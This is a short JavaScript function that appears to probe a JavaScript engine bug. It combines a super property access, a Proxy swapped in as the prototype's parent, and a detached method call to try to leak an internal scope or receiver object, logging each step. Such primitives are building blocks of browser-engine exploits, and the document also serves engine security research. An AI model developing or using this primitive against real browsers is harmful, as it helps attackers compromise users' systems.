function leakScope() {
    try {
        class Leaker {
            leak() {
                return super.foo;
            }
        }

        Leaker.prototype.__proto__ = new Proxy({}, {
            get(target, propertyName, receiver) {
                log("[proxy trap] target: " + target + ", property: " + propertyName);

                // Add Symbol.toPrimitive to receiver so it doesn't throw
                receiver[Symbol.toPrimitive] = function(hint) {
                    log("coercing receiver to primitive with hint: " + hint);
                    return "dummy"; // Just return a harmless string
                };

                return receiver;
            }
        });

        const foo = 42;
        const { leak } = Leaker.prototype;

        let res = (() => leak())();
        log("scope leak success: " + res);
        return res;
    } catch (e) {
        log("leakScope() threw: " + e);
        return null;
    }
}
